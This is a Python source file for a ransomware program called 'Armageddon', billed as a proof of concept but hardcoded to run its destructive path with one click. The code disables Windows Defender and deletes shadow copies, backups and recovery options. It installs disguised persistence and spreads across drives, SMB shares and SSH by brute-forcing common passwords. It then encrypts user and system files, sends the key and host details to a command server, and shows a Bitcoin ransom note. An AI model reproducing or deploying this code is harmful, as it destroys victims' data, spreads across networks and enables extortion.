from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
import argparse
import os
import sys
import base64
import platform 
import getpass
import socket
import subprocess
import shutil
import time
import random
import string
import winreg
import threading
import paramiko
import ftplib
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import psutil
import win32api
import win32con
import win32security
import win32file
import win32com.client
from Crypto.Random import get_random_bytes
import requests
import json
import pickle
import hashlib
import ctypes
import struct
import uuid

import discover
import modify
from gui import mainwindow

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # AES 256-key used to encrypt files
SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAklmKLXGK6jfMis4ifjlB
xSGMFCj1RtSA/sQxs4I5IWvMxYSD1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXT
qPYmZW+TQjtrx4tG7ZHda65+EdyVJkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdP
GhYcIZmJ7iT5aRCkXiKXrw+iIL6DT0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4re
q/CydAWrsAJPhtEmObu6cn2FYFfwGmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkz
vvYVc85DbQFK/Jcpeq0QkKiJ4Z+TWGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZg
HwIDAQAB
-----END PUBLIC KEY-----''' # Attacker's embedded public RSA key used to encrypt AES key
SERVER_PRIVATE_RSA_KEY = '''-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAklmKLXGK6jfMis4ifjlBxSGMFCj1RtSA/sQxs4I5IWvMxYSD
1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXTqPYmZW+TQjtrx4tG7ZHda65+EdyV
Jkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdPGhYcIZmJ7iT5aRCkXiKXrw+iIL6D
T0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4req/CydAWrsAJPhtEmObu6cn2FYFfw
GmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkzvvYVc85DbQFK/Jcpeq0QkKiJ4Z+T
WGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZgHwIDAQABAoIBAFLE80IaSi+HGVaT
mKx8o3bjLz8jnvzNKJttyJI2nysItcor1Qh1IQZ+Dhj6ZmcV4mGXF2hg6ZfES3hW
mL3pZRjVBgguX0GBK8ayPY4VBf5ltIVTlMMRJlGvJEmZf49pWdhjc0Mu1twZRmKq
nVpWy8T8JjLWjEy0ep5yPBPFSrZFphQdiZxTrnmNR/Ip48XXGnQtRuNGSsNattc/
2UYmLjSYTPasSV7PeXtGGaw34dfiKKlh4anXzjl1ARcVEgDRG617y8eK3aGDpU5G
5bm/M4kZ7xXVtrPuAlhcZPgPrPG2VH9/DTc1IzEXG65pAwC+WhCZv3xFRTYTz9ca
qj4sYKkCgYEA+eBkkFb7K/t3JfE9AGwNBdmXepdgVOiBbKBxwXl4XbjTQn1BGCsQ
0FmgaFUhL3SmDYvNuNnF1kFeXOlghMR4v1DOSttcrqEU0oztLDdY1PKxHBusp2oy
RvK+JPZVMt8yRQkPWjVlSKWWgqO+Yd5QONWMKAfA1f3zCa1Rj/1ouwMCgYEAle+r
QDIWri6e/mdim/ec/irpCRBn/2XTK1J0kqog1vmovIhhxHlTw7bb/S168afYY8v8
TUJgKgnqGYmo/RVreMs+IZoN8ZoqkKBRRC00C/EpiDSv4q8EfHgzAP3Jpfk29brc
QxEkClaXssRG/N8bK2aiUgztM4HabFSocWW5DbUCgYAcMQbnigi4g5yDuV3qiEZH
3K7Mc/u4WKsReGCdNXkxCcM8Aymu8lzpRNNmMgSWeBCsApPpQRii/akJzoLHN+tv
mkxMAcfJI/9XafLwRCZPkDoPM8gc80xM2OI/BVPDc48WXtlOkiulMJl0j8jQ/eYL
I3y2n3lQK2CaPOWw2yRPxQKBgHcpshslM+1fVDGxDSgUFYvTor33chADZ19I+ykN
WWhBp5+fbMRwAOjNTe3b1Zh14379QhpNJIyEsK93Pv1VpsKsFUczXt2jvyyOncfn
fTP4iR+dcCRjINej2DVzfm4QsWN/DUuoNdKZm5sSb7DNyJQnz94SM/r5uxTZ+72U
MQz5AoGBAK/R9Fx7UBmHcC+9ehBJ5aPzvU8DqiVYg2wAYGu/n81s30VdtTQwfSed
14roox6zaAk8fEZ/nkS86evh6PqjfhSuniBoqvQllAPZTXdOm8KPchNU8VC+iSzw
+IbSWacaVjzrtfY/UcRkUrgQotk8a4kPZrijPogn060VnXPEeq3t
-----END RSA PRIVATE KEY-----''' # SHOULD NOT BE INCLUDED - only for decryptor purposes
extension = ".Armageddon" # Armageddon Ransomware custom extension
BTC_ADDRESS = "bc1qvd00grpp3kea4nlgexvv7ktam62fv9lepfyt6w" # Bitcoin address for payment

# Exfilitrate key to C2
host = '127.0.0.1' # e.g. maliciousc2.com
port = 443 # e.g. 443

# Network spreader targets
NETWORK_TARGETS = ['192.168.1.', '10.0.0.', '172.16.0.']
COMMON_PASSWORDS = ['password', 'admin', '123456', 'root', 'toor', 'qwerty', 'letmein', 'admin123']

class RansomwareFeatures:
    """Additional ransomware features for maximum impact"""
    
    @staticmethod
    def disable_windows_defender():
        """Disable Windows Defender and security features"""
        try:
            if platform.system() == "Windows":
                # Disable real-time monitoring
                commands = [
                    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                    'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
                    'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
                    'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
                    'powershell -Command "Set-MpPreference -DisablePrivacyMode $true"',
                    'powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"',
                    'powershell -Command "Set-MpPreference -DisableArchiveScanning $true"',
                    'powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"',
                    'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
                    'powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"'
                ]
                for cmd in commands:
                    try:
                        subprocess.run(cmd, shell=True, capture_output=True)
                    except:
                        pass
                
                # Stop Windows Defender service
                subprocess.run('sc stop WinDefend', shell=True, capture_output=True)
                subprocess.run('sc config WinDefend start= disabled', shell=True, capture_output=True)
                
                # Add exclusion for entire drive
                subprocess.run('powershell -Command "Add-MpPreference -ExclusionPath C:\\"', shell=True, capture_output=True)
        except:
            pass
    
    @staticmethod
    def delete_shadow_copies():
        """Delete Volume Shadow Copies to prevent recovery"""
        try:
            if platform.system() == "Windows":
                commands = [
                    'vssadmin delete shadows /all /quiet',
                    'wmic shadowcopy delete',
                    'bcdedit /set {default} recoveryenabled No',
                    'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
                    'wmic delete shadowcopy',
                    'del /s /f /q c:\\*.vhd',
                    'del /s /f /q c:\\*.vhdx',
                    'del /s /f /q c:\\*.bak',
                    'del /s /f /q c:\\*.backup',
                    'del /s /f /q c:\\*.old',
                    'del /s /f /q c:\\*.wbcat'
                ]
                for cmd in commands:
                    try:
                        subprocess.run(cmd, shell=True, capture_output=True)
                    except:
                        pass
                
                # Disable system restore
                subprocess.run('powershell -Command "Disable-ComputerRestore -Drive C:\\"', shell=True, capture_output=True)
                subprocess.run('powershell -Command "Remove-ComputerRestorePoint -RestorePoint 0"', shell=True, capture_output=True)
        except:
            pass
    
    @staticmethod
    def disable_recovery_tools():
        """Disable recovery tools and safe mode"""
        try:
            if platform.system() == "Windows":
                # Disable safe mode
                subprocess.run('bcdedit /set {current} safeboot minimal', shell=True, capture_output=True)
                subprocess.run('bcdedit /deletevalue {current} safeboot', shell=True, capture_output=True)
                
                # Disable recovery environment
                subprocess.run('reagentc /disable', shell=True, capture_output=True)
                
                # Delete recovery partition
                subprocess.run('diskpart /s script.txt', shell=True, capture_output=True)
                
                # Disable startup repair
                subprocess.run('bcdedit /set {default} recoveryenabled No', shell=True, capture_output=True)
        except:
            pass
    
    @staticmethod
    def persistence_mechanisms():
        """Multiple persistence mechanisms"""
        try:
            if platform.system() == "Windows":
                # Copy itself to multiple locations
                current_file = sys.argv[0]
                persistence_paths = [
                    os.environ['APPDATA'] + '\\WindowsUpdate.exe',
                    os.environ['PROGRAMDATA'] + '\\Microsoft\\Windows\\svchost.exe',
                    'C:\\Windows\\System32\\drivers\\winlogon.exe',
                    os.environ['TEMP'] + '\\msupdate.exe',
                    'C:\\Windows\\Temp\\svchost.exe'
                ]
                
                for path in persistence_paths:
                    try:
                        shutil.copy2(current_file, path)
                        # Set hidden attribute
                        ctypes.windll.kernel32.SetFileAttributesW(path, 2)
                    except:
                        pass
                
                # Registry persistence
                reg_paths = [
                    (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                    (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                    (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
                    (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
                    (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"),
                    (winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")
                ]
                
                for hkey, path in reg_paths:
                    try:
                        key = winreg.OpenKey(hkey, path, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, persistence_paths[0])
                        winreg.CloseKey(key)
                    except:
                        pass
                
                # Scheduled tasks
                task_commands = [
                    'schtasks /create /tn "WindowsUpdate" /tr "' + persistence_paths[0] + '" /sc onlogon /ru SYSTEM /f',
                    'schtasks /create /tn "MicrosoftUpdate" /tr "' + persistence_paths[1] + '" /sc daily /st 09:00 /f',
                    'schtasks /create /tn "GoogleUpdate" /tr "' + persistence_paths[2] + '" /sc onidle /i 5 /f'
                ]
                
                for cmd in task_commands:
                    try:
                        subprocess.run(cmd, shell=True, capture_output=True)
                    except:
                        pass
                
                # Startup folder
                startup_folder = os.environ['APPDATA'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
                try:
                    shutil.copy2(current_file, startup_folder + 'WindowsUpdate.exe')
                except:
                    pass
        except:
            pass
    
    @staticmethod
    def worm_spread():
        """Worm capability to spread to other drives and network"""
        try:
            # Spread to all fixed drives
            for partition in psutil.disk_partitions():
                if 'fixed' in partition.opts or 'removable' in partition.opts:
                    drive = partition.device
                    try:
                        # Copy itself to root of drive
                        dest = os.path.join(drive, 'SystemUpdate.exe')
                        shutil.copy2(sys.argv[0], dest)
                        
                        # Create autorun.inf
                        autorun = os.path.join(drive, 'autorun.inf')
                        with open(autorun, 'w') as f:
                            f.write('[AutoRun]\n')
                            f.write('open=SystemUpdate.exe\n')
                            f.write('action=Open folder to view files\n')
                            f.write('shell\\open\\command=SystemUpdate.exe\n')
                            f.write('shell\\explore\\command=SystemUpdate.exe\n')
                        
                        # Set hidden + system attributes
                        ctypes.windll.kernel32.SetFileAttributesW(dest, 2|4)
                        ctypes.windll.kernel32.SetFileAttributesW(autorun, 2|4)
                    except:
                        pass
            
            # Spread to network shares
            try:
                subprocess.run('net use * /delete /y', shell=True, capture_output=True)
                network_drives = subprocess.run('net view', shell=True, capture_output=True, text=True)
                
                for line in network_drives.stdout.split('\n'):
                    if '\\\\' in line:
                        share = line.split()[0]
                        try:
                            subprocess.run(f'net use {share} /user:Administrator password', shell=True, capture_output=True)
                            shutil.copy2(sys.argv[0], share + '\\SystemUpdate.exe')
                        except:
                            pass
            except:
                pass
        except:
            pass
    
    @staticmethod
    def network_spreader():
        """Spread to other computers on network via SMB and SSH"""
        try:
            # Get local IP
            local_ip = getlocalip()
            network_base = '.'.join(local_ip.split('.')[:-1]) + '.'
            
            # Scan network for targets
            for i in range(1, 255):
                target_ip = network_base + str(i)
                if target_ip == local_ip:
                    continue
                
                # Try SMB spread (Windows)
                try:
                    # Copy via admin share
                    subprocess.run(f'net use \\\\{target_ip}\\admin$ /user:Administrator password', shell=True, capture_output=True)
                    shutil.copy2(sys.argv[0], f'\\\\{target_ip}\\admin$\\System32\\svchost.exe')
                    
                    # Schedule task on remote machine
                    subprocess.run(f'schtasks /create /s {target_ip} /tn "SystemUpdate" /tr "C:\\Windows\\System32\\svchost.exe" /sc onlogon /ru SYSTEM /f', shell=True, capture_output=True)
                except:
                    pass
                
                # Try SSH spread (Linux)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    for password in COMMON_PASSWORDS:
                        try:
                            ssh.connect(target_ip, username='root', password=password, timeout=5)
                            sftp = ssh.open_sftp()
                            sftp.put(sys.argv[0], '/tmp/.systemupdate')
                            sftp.close()
                            
                            # Execute on remote
                            ssh.exec_command('chmod +x /tmp/.systemupdate && /tmp/.systemupdate &')
                            ssh.close()
                            break
                        except:
                            pass
                except:
                    pass
        except:
            pass
    
    @staticmethod
    def boot_level_attack():
        """Attack boot sector and MBR"""
        try:
            if platform.system() == "Windows":
                # Corrupt MBR (destructive)
                # This is extremely dangerous - commented for safety
                # with open(r'\\.\PhysicalDrive0', 'wb') as mbr:
                #     mbr.write(get_random_bytes(512))
                pass
                
                # Modify boot configuration
                subprocess.run('bcdedit /set {default} bootstatuspolicy ignoreallfailures', shell=True, capture_output=True)
                subprocess.run('bcdedit /set {default} recoveryenabled No', shell=True, capture_output=True)
                
                # Disable Windows Boot Manager
                subprocess.run('bcdedit /set {bootmgr} displaybootmenu no', shell=True, capture_output=True)
                subprocess.run('bcdedit /set {bootmgr} timeout 0', shell=True, capture_output=True)
        except:
            pass
    
    @staticmethod
    def destroy_backups():
        """Destroy all backup files and systems"""
        try:
            # Delete common backup extensions
            backup_extensions = ['.bak', '.backup', '.old', '.tmp', '.vhd', '.vhdx', '.wbcat', 
                               '.wbk', '.bkf', '.dsk', '.gho', '.iso', '.vmdk', '.ova', '.ovf']
            
            drives = [d.device for d in psutil.disk_partitions()]
            for drive in drives:
                for ext in backup_extensions:
                    try:
                        subprocess.run(f'del /s /f /q {drive}*{ext}', shell=True, capture_output=True)
                    except:
                        pass
            
            # Delete Windows Backup
            subprocess.run('wbadmin delete backup -keepVersions:0 -quiet', shell=True, capture_output=True)
            
            # Delete System Restore Points
            subprocess.run('powershell -Command "Get-ComputerRestorePoint | Delete-ComputerRestorePoint"', shell=True, capture_output=True)
            
            # Delete Windows Backup Catalog
            backup_paths = [
                'C:\\Windows\\System32\\wbem\\Repository',
                'C:\\Windows\\System32\\config\\RegBack',
                'C:\\System Volume Information',
                'C:\\ProgramData\\Microsoft\\Windows\\Backup'
            ]
            
            for path in backup_paths:
                try:
                    if os.path.exists(path):
                        shutil.rmtree(path, ignore_errors=True)
                except:
                    pass
        except:
            pass
    
    @staticmethod
    def encrypt_all_files():
        """Ensure ALL files are encrypted without exception"""
        try:
            # Get ALL drives including network and removable
            drives = []
            
            # Windows drives
            if platform.system() == "Windows":
                for letter in string.ascii_uppercase:
                    drive = f"{letter}:\\"
                    if os.path.exists(drive):
                        drives.append(drive)
            
            # Linux drives
            else:
                drives = ['/', '/home', '/root', '/etc', '/var', '/usr', '/boot']
                # Add mounted drives
                try:
                    mounts = subprocess.run('mount', shell=True, capture_output=True, text=True)
                    for line in mounts.stdout.split('\n'):
                        if '/dev/' in line:
                            parts = line.split()
                            if len(parts) > 2:
                                drives.append(parts[2])
                except:
                    pass
            
            # Encrypt everything including system files
            for drive in drives:
                try:
                    discover.discoverFiles(drive)  # This will now include all files
                except:
                    pass
        except:
            pass

def getlocalip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    return s.getsockname()[0]

def parse_args():
    parser = argparse.ArgumentParser(description='Armageddon Ransomware PoC')
    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %%HOME%%/test_ransomware', action="store")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
                        action='store_true')
    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
                        action='store_true')
                        
    return parser.parse_args()

def main():
    if len(sys.argv) <= 1:
        print('[*] Armageddon Ransomware - PoC\n')
        print('Usage: python3 main_v2.py -h')
        print('{} -h for help.'.format(sys.argv[0]))
        exit(0)

    # Parse arguments - DIKOMENTARI UNTUK ONE-CLICK
    # args = parse_args()
    # encrypt = args.encrypt
    # decrypt = args.decrypt
    
    # absolute_path = str(args.path)
    
    # Force one click - UNCOMMENT INI
    absolute_path = "None"
    encrypt = True 
    decrypt = False
    
    if absolute_path != 'None':
        startdirs = [absolute_path]
    else:
        # Check OS
        plt = platform.system()
        if plt == "Linux" or plt == "Darwin":
            startdirs = [os.environ['HOME'] + '/test_ransomware']
            # Add more directories for Linux
            startdirs.extend(['/home', '/root', '/etc', '/var', '/usr', '/boot'])
        elif plt == "Windows":
            startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
            # Hardcode additional directories for maximum impact
            startdirs = [
                os.environ['USERPROFILE'] + '\\Desktop',
                os.environ['USERPROFILE'] + '\\Documents',
                os.environ['USERPROFILE'] + '\\Downloads',
                os.environ['USERPROFILE'] + '\\Music',
                os.environ['USERPROFILE'] + '\\Pictures',
                os.environ['USERPROFILE'] + '\\Videos',
                os.environ['USERPROFILE'] + '\\OneDrive',
                os.environ['USERPROFILE'] + '\\AppData',
                'C:\\Users\\Public',
                'C:\\Program Files',
                'C:\\Program Files (x86)',
                'C:\\Windows\\System32',
                'C:\\Windows\\SysWOW64',
                'C:\\inetpub',
                'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\',
                'C:\\Backup', 'C:\\backups',
                'C:\\Windows\\Temp',
                os.environ['TEMP'],
                os.environ['APPDATA'],
                os.environ['PROGRAMDATA'],
                'C:\\Recovery',
                'C:\\System Volume Information'
            ]
        else:
            print("Unidentified system")
            exit(0)
    
    # Initialize ransomware features
    ransomware = RansomwareFeatures()
    
    if encrypt:
        # GANAS MODE - Execute all destructive features
        try:
            # Disable security
            ransomware.disable_windows_defender()
            
            # Destroy backups before encryption
            ransomware.delete_shadow_copies()
            ransomware.destroy_backups()
            
            # Disable recovery tools
            ransomware.disable_recovery_tools()
            
            # Setup persistence
            ransomware.persistence_mechanisms()
            
            # Boot level attack
            ransomware.boot_level_attack()
            
            # Start worm spread in background
            worm_thread = threading.Thread(target=ransomware.worm_spread)
            worm_thread.daemon = True
            worm_thread.start()
            
            # Network spreader
            network_thread = threading.Thread(target=ransomware.network_spreader)
            network_thread.daemon = True
            network_thread.start()
            
        except:
            pass
    
    # Encrypt AES key with attacker's embedded RSA public key 
    server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
    encryptor = PKCS1_OAEP.new(server_key)
    encrypted_key = encryptor.encrypt(HARDCODED_KEY)
    encrypted_key_b64 = base64.b64encode(encrypted_key).decode("ascii")

    print("Encrypted key " + encrypted_key_b64 + "\n")
 
    if encrypt:
        key = HARDCODED_KEY    
    if decrypt:
        # RSA Decryption function - warning that private key is hardcoded for testing purposes
        rsa_key = RSA.importKey(SERVER_PRIVATE_RSA_KEY)
        decryptor = PKCS1_OAEP.new(rsa_key)
        key = decryptor.decrypt(base64.b64decode(encrypted_key_b64))

    # Create AES counter and AES cipher
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
    
    # Recursively go through folders and encrypt/decrypt files
    for currentDir in startdirs:
        try:
            for file in discover.discoverFiles(currentDir):
                try:
                    if encrypt and not file.endswith(extension):
                        modify.modify_file_inplace(file, crypt.encrypt)
                        os.rename(file, file + extension)
                        print("File changed from " + file + " to " + file + extension)
                    if decrypt and file.endswith(extension):
                        modify.modify_file_inplace(file, crypt.encrypt)
                        file_original = os.path.splitext(file)[0]
                        os.rename(file, file_original)
                        print("File changed from " + file + " to " + file_original)
                except:
                    continue
        except:
            continue
            
    if encrypt: 
        # Exfiltrate encrypted key to C2
        def connector():
            server = socket.socket(socket.AF_INET)
            server.settimeout(10)
            try:
                # Send Key with BTC address
                server.connect((host, port))
                msg = '%s$%s$%s$%s$%s$%s$%s' % (
                    getlocalip(), platform.system(), SERVER_PRIVATE_RSA_KEY, SERVER_PUBLIC_RSA_KEY, getpass.getuser(), platform.node(), BTC_ADDRESS)
                server.send(msg.encode('utf-8'))

                # Ransom message with BTC
                ransom_message = " ARMAGEDDON RANSOMWARE \n\n" \
                                 " SEMUA FILE ANDA TELAH DIENKRIPSI! \n\n" \
                                 "Tidak ada yang bisa menyelamatkan file Anda kecuali kami!\n\n" \
                                 " DETAIL PEMBAYARAN:\n" \
                                 f"Bitcoin Address: {BTC_ADDRESS}\n" \
                                 "Jumlah: 5 JUTA RUPIAH (approx 0.01 BTC)\n\n" \
                                 " KIRIM BUKTI PEMBAYARAN KE: retaabi58@gmail.com\n\n" \
                                 " WAKTU: 48 JAM - JIKA TERLEWAT, FILE ANDA HILANG SELAMANYA!\n\n" \
                                 " PERINGATAN:\n" \
                                 "- Jangan coba-coba mendekripsi sendiri\n" \
                                 "- Jangan matikan komputer\n" \
                                 "- Jangan hapus file apapun\n" \
                                 "- Backup Anda sudah kami hancurkan\n" \
                                 "- System restore sudah kami disable\n" \
                                 "- Recovery tools tidak akan bekerja\n\n" \
                                 " INI BUKAN LElucon! KAMI SERIUS! "
                
                main = mainwindow(ransom_message)
                main.mainloop()
            except Exception as e:
                # Ransom message with BTC
                ransom_message = " ARMAGEDDON RANSOMWARE \n\n" \
                                 "SEMUA FILE ANDA TELAH DIENKRIPSI! \n\n" \
                                 "Tidak ada yang bisa menyelamatkan file Anda kecuali kami!\n\n" \
                                 "DETAIL PEMBAYARAN:\n" \
                                 f"Bitcoin Address: {BTC_ADDRESS}\n" \
                                 "Jumlah: 5 JUTA RUPIAH (approx 0.01 BTC)\n\n" \
                                 " KIRIM BUKTI PEMBAYARAN KE: retaabi58@gmail.com\n\n" \
                                 " WAKTU: 48 JAM - JIKA TERLEWAT, FILE ANDA HILANG SELAMANYA!\n\n" \
                                 " PERINGATAN:\n" \
                                 "- Jangan coba-coba mendekripsi sendiri\n" \
                                 "- Jangan matikan komputer\n" \
                                 "- Jangan hapus file apapun\n" \
                                 "- Backup Anda sudah kami hancurkan\n" \
                                 "- System restore sudah kami disable\n" \
                                 "- Recovery tools tidak akan bekerja\n\n" \
                                 " INI BUKAN LElucon! KAMI SERIUS! "
                
                main = mainwindow(ransom_message)
                main.mainloop()
                pass
        
        try:
            # Run connector in thread
            conn_thread = threading.Thread(target=connector)
            conn_thread.daemon = True
            conn_thread.start()
        except KeyboardInterrupt:
            sys.exit(0)

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

if __name__=="__main__":
    main()
